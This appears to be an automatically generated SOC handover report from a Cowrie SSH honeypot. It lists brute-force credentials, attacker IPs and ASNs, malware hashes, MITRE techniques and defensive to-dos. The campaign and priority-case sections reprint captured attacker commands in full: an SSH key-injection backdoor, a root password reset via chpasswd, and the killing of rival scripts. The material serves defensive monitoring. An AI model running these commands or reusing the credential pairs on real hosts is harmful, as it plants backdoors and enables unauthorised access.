# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-30 |
| **Generated At** | 2026-03-30T22:33:49Z |
| **Shift Time** | 22:33 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **30** |
| Confirmed Threats | **24** |
| False Positives Filtered | **6** (20.0%) |
| Unique Attacker IPs | **22** |
| Countries of Origin | **11** |
| High Severity Cases | **6** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **24** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **19** |
| Unique Credential Pairs | **17** |
| Unique Usernames | **10** |
| Unique Passwords | **17** |
| Successful Auth Pairs | **6** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 6 |
| `Root` | 3 |
| `345gs5662d34` | 2 |
| `centos` | 2 |
| `nobody` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 2 |
| `3245gs5662d34` | 2 |
| `3333` | 1 |
| `qazwsx111` | 1 |
| `00` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 2 |
| `root` | `3245gs5662d34` | 2 |
| `root` | `3333` | 1 |
| `root` | `qazwsx111` | 1 |
| `nobody` | `00` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `3333` | `125.19.244.62` | 2026-03-30T20:43:48 |
| `root` | `qazwsx111` | `171.244.61.82` | 2026-03-30T20:55:38 |
| `root` | `3245gs5662d34` | `171.244.61.82` | 2026-03-30T20:55:42 |
| `root` | `dm1234567` | `201.77.124.248` | 2026-03-30T21:37:40 |
| `root` | `3245gs5662d34` | `201.77.124.248` | 2026-03-30T21:37:47 |
| `root` | `tukj123456` | `47.93.142.191` | 2026-03-30T22:07:16 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:F0dh8xDje9D6"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `47.93.142.191`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `201.77.124.248`, `171.244.61.82`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **22** |
| Unique ASNs | **20** |
| High-Risk ASNs | **16** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS9498` | BHARTI Airtel Ltd. | 2 | HIGH |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 2 | HIGH |
| `AS46562` | Performive LLC | 1 | MEDIUM |
| `AS2527` | Sony Network Communications Inc. | 1 | HIGH |
| `AS25159` | PJSC MegaFon | 1 | HIGH |
| `AS9829` | National Internet Backbone | 1 | HIGH |
| `AS18881` | TELEFÔNICA BRASIL S.A | 1 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (6)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-fa094017e816

| Field | Detail |
|---|---|
| **Source IP** | `125.19.244[.]62` |
| **First Seen** | 2026-03-30 20:43 |
| **Last Seen** | 2026-03-30 20:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 20:43:46` | `cowrie.session.connect` |
| `2026-03-30 20:43:47` | `cowrie.client.version` |
| `2026-03-30 20:43:47` | `cowrie.client.kex` |
| `2026-03-30 20:43:48` | `cowrie.login.success` |
| `2026-03-30 20:43:49` | `cowrie.direct-tcpip.request` |
| `2026-03-30 20:43:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.19.244[.]62` to AbuseIPDB if not already reported
- [ ] Block `125.19.244[.]62` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-619084d46c9f

| Field | Detail |
|---|---|
| **Source IP** | `171.244.61[.]82` |
| **First Seen** | 2026-03-30 20:55 |
| **Last Seen** | 2026-03-30 20:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 20:55:37` | `cowrie.session.connect` |
| `2026-03-30 20:55:37` | `cowrie.client.version` |
| `2026-03-30 20:55:37` | `cowrie.client.kex` |
| `2026-03-30 20:55:38` | `cowrie.login.success` |
| `2026-03-30 20:55:38` | `cowrie.session.params` |
| `2026-03-30 20:55:38` | `cowrie.command.input` |
| `2026-03-30 20:55:38` | `cowrie.command.failed` |
| `2026-03-30 20:55:38` | `cowrie.log.closed` |
| `2026-03-30 20:55:39` | `cowrie.session.params` |
| `2026-03-30 20:55:39` | `cowrie.command.input` |
| `2026-03-30 20:55:39` | `cowrie.session.file_download` |
| `2026-03-30 20:55:39` | `cowrie.log.closed` |
| `2026-03-30 20:55:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.61[.]82` to AbuseIPDB if not already reported
- [ ] Block `171.244.61[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4361e91fd4b7

| Field | Detail |
|---|---|
| **Source IP** | `171.244.61[.]82` |
| **First Seen** | 2026-03-30 20:55 |
| **Last Seen** | 2026-03-30 20:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 20:55:41` | `cowrie.session.connect` |
| `2026-03-30 20:55:41` | `cowrie.client.version` |
| `2026-03-30 20:55:42` | `cowrie.client.kex` |
| `2026-03-30 20:55:42` | `cowrie.login.success` |
| `2026-03-30 20:55:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.61[.]82` to AbuseIPDB if not already reported
- [ ] Block `171.244.61[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7420440b7d2

| Field | Detail |
|---|---|
| **Source IP** | `201.77.124[.]248` |
| **First Seen** | 2026-03-30 21:37 |
| **Last Seen** | 2026-03-30 21:37 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 21:37:38` | `cowrie.session.connect` |
| `2026-03-30 21:37:38` | `cowrie.client.version` |
| `2026-03-30 21:37:38` | `cowrie.client.kex` |
| `2026-03-30 21:37:40` | `cowrie.login.success` |
| `2026-03-30 21:37:40` | `cowrie.session.params` |
| `2026-03-30 21:37:40` | `cowrie.command.input` |
| `2026-03-30 21:37:40` | `cowrie.command.failed` |
| `2026-03-30 21:37:41` | `cowrie.log.closed` |
| `2026-03-30 21:37:42` | `cowrie.session.params` |
| `2026-03-30 21:37:42` | `cowrie.command.input` |
| `2026-03-30 21:37:42` | `cowrie.session.file_download` |
| `2026-03-30 21:37:42` | `cowrie.log.closed` |
| `2026-03-30 21:37:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.77.124[.]248` to AbuseIPDB if not already reported
- [ ] Block `201.77.124[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebcff7989229

| Field | Detail |
|---|---|
| **Source IP** | `201.77.124[.]248` |
| **First Seen** | 2026-03-30 21:37 |
| **Last Seen** | 2026-03-30 21:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 21:37:46` | `cowrie.session.connect` |
| `2026-03-30 21:37:46` | `cowrie.client.version` |
| `2026-03-30 21:37:46` | `cowrie.client.kex` |
| `2026-03-30 21:37:47` | `cowrie.login.success` |
| `2026-03-30 21:37:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.77.124[.]248` to AbuseIPDB if not already reported
- [ ] Block `201.77.124[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e0a645ad08c

| Field | Detail |
|---|---|
| **Source IP** | `47.93.142[.]191` |
| **First Seen** | 2026-03-30 22:07 |
| **Last Seen** | 2026-03-30 22:07 |
| **Session Duration** | 36s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:F0dh8xDje9D6"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 22:07:14` | `cowrie.session.connect` |
| `2026-03-30 22:07:14` | `cowrie.client.version` |
| `2026-03-30 22:07:15` | `cowrie.client.kex` |
| `2026-03-30 22:07:16` | `cowrie.login.success` |
| `2026-03-30 22:07:17` | `cowrie.session.params` |
| `2026-03-30 22:07:17` | `cowrie.command.input` |
| `2026-03-30 22:07:17` | `cowrie.command.failed` |
| `2026-03-30 22:07:17` | `cowrie.log.closed` |
| `2026-03-30 22:07:18` | `cowrie.session.params` |
| `2026-03-30 22:07:18` | `cowrie.command.input` |
| `2026-03-30 22:07:18` | `cowrie.session.file_download` |
| `2026-03-30 22:07:18` | `cowrie.log.closed` |
| `2026-03-30 22:07:35` | `cowrie.session.params` |
| `2026-03-30 22:07:35` | `cowrie.command.input` |
| `2026-03-30 22:07:35` | `cowrie.log.closed` |
| `2026-03-30 22:07:36` | `cowrie.session.params` |
| `2026-03-30 22:07:36` | `cowrie.command.input` |
| `2026-03-30 22:07:36` | `cowrie.log.closed` |
| `2026-03-30 22:07:37` | `cowrie.session.params` |
| `2026-03-30 22:07:37` | `cowrie.command.input` |
| `2026-03-30 22:07:37` | `cowrie.session.file_download` |
| `2026-03-30 22:07:37` | `cowrie.log.closed` |
| `2026-03-30 22:07:38` | `cowrie.session.params` |
| `2026-03-30 22:07:38` | `cowrie.command.input` |
| `2026-03-30 22:07:38` | `cowrie.log.closed` |
| `2026-03-30 22:07:39` | `cowrie.session.params` |
| `2026-03-30 22:07:39` | `cowrie.command.input` |
| `2026-03-30 22:07:39` | `cowrie.log.closed` |
| `2026-03-30 22:07:40` | `cowrie.session.params` |
| `2026-03-30 22:07:40` | `cowrie.command.input` |
| `2026-03-30 22:07:40` | `cowrie.command.input` |
| `2026-03-30 22:07:40` | `cowrie.log.closed` |
| `2026-03-30 22:07:41` | `cowrie.session.params` |
| `2026-03-30 22:07:41` | `cowrie.command.input` |
| `2026-03-30 22:07:41` | `cowrie.log.closed` |
| `2026-03-30 22:07:42` | `cowrie.session.params` |
| `2026-03-30 22:07:42` | `cowrie.command.input` |
| `2026-03-30 22:07:42` | `cowrie.log.closed` |
| `2026-03-30 22:07:43` | `cowrie.session.params` |
| `2026-03-30 22:07:43` | `cowrie.command.input` |
| `2026-03-30 22:07:43` | `cowrie.log.closed` |
| `2026-03-30 22:07:44` | `cowrie.session.params` |
| `2026-03-30 22:07:44` | `cowrie.command.input` |
| `2026-03-30 22:07:44` | `cowrie.log.closed` |
| `2026-03-30 22:07:45` | `cowrie.session.params` |
| `2026-03-30 22:07:45` | `cowrie.command.input` |
| `2026-03-30 22:07:45` | `cowrie.log.closed` |
| `2026-03-30 22:07:46` | `cowrie.session.params` |
| `2026-03-30 22:07:46` | `cowrie.command.input` |
| `2026-03-30 22:07:46` | `cowrie.log.closed` |
| `2026-03-30 22:07:47` | `cowrie.session.params` |
| `2026-03-30 22:07:47` | `cowrie.command.input` |
| `2026-03-30 22:07:47` | `cowrie.log.closed` |
| `2026-03-30 22:07:48` | `cowrie.session.params` |
| `2026-03-30 22:07:48` | `cowrie.command.input` |
| `2026-03-30 22:07:48` | `cowrie.log.closed` |
| `2026-03-30 22:07:49` | `cowrie.session.params` |
| `2026-03-30 22:07:49` | `cowrie.command.input` |
| `2026-03-30 22:07:49` | `cowrie.log.closed` |
| `2026-03-30 22:07:50` | `cowrie.session.params` |
| `2026-03-30 22:07:50` | `cowrie.command.input` |
| `2026-03-30 22:07:50` | `cowrie.log.closed` |
| `2026-03-30 22:07:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.93.142[.]191` to AbuseIPDB if not already reported
- [ ] Block `47.93.142[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `150.246.249[.]149` | **3** | 2026-03-30 21:08 | 2026-03-30 22:22 | 1m | 0 | `T1592` | 🟢 LOW |
| `104.152.58[.]233` | 1 | 2026-03-30 20:59 | 2026-03-30 20:59 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `171.244.61[.]82` | 1 | 2026-03-30 20:55 | 2026-03-30 20:55 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `175.43.162[.]194` | 1 | 2026-03-30 21:37 | 2026-03-30 21:37 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `176.36.174[.]177` | 1 | 2026-03-30 21:22 | 2026-03-30 21:23 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `179.185.1[.]97` | 1 | 2026-03-30 22:21 | 2026-03-30 22:21 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `182.252.140[.]114` | 1 | 2026-03-30 20:44 | 2026-03-30 20:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `182.60.128[.]241` | 1 | 2026-03-30 21:56 | 2026-03-30 21:56 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `182.76.71[.]82` | 1 | 2026-03-30 21:42 | 2026-03-30 21:42 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `196.189.126[.]10` | 1 | 2026-03-30 21:03 | 2026-03-30 21:03 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `201.77.124[.]248` | 1 | 2026-03-30 21:37 | 2026-03-30 21:37 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `203.123.219[.]137` | 1 | 2026-03-30 22:16 | 2026-03-30 22:16 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `24.75.185[.]101` | 1 | 2026-03-30 21:58 | 2026-03-30 21:58 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `31.173.66[.]222` | 1 | 2026-03-30 20:57 | 2026-03-30 20:57 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `67.197.111[.]225` | 1 | 2026-03-30 21:39 | 2026-03-30 21:39 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `8.138.44[.]199` | 1 | 2026-03-30 22:28 | 2026-03-30 22:28 | 8s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `182.60.128[.]241` | IN | Mahanagar Telephone Nigam Limited | **100** ⚠️ | 1 |
| `196.189.126[.]10` | ET | Ethio Telecom | **100** ⚠️ | 44 |
| `150.246.249[.]149` | JP | So-net Service | **100** ⚠️ | 50 |
| `179.185.1[.]97` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 15 |
| `203.123.219[.]137` | KR | SK Broadband Co Ltd | **100** ⚠️ | 50 |
| `24.75.185[.]101` | CA | Cogeco Connexion inc | **100** ⚠️ | 3 |
| `182.252.140[.]114` | KR | abcle | **100** ⚠️ | 43 |
| `67.197.111[.]225` | US | Comporium, Inc | **100** ⚠️ | 39 |
| `104.152.58[.]233` | US | VOLICO | **100** ⚠️ | 8 |
| `182.76.71[.]82` | IN | YAJNA TECHNOLOGIS PVT. LT | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 22 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 13 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 6 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 3 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 3 |

---

## 🔕 False Positive Summary (6 filtered)

| Reason | Count |
|---|---|
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 6 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 30 cases |
| Tool 34  | Credential Extractor        | ✅ 19 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 22 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 6 filtered (20.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 20 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 6 priority case(s) shown individually · 16 recon entry/entries in table (1 group(s) consolidating 3 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-30T22:33:49Z_
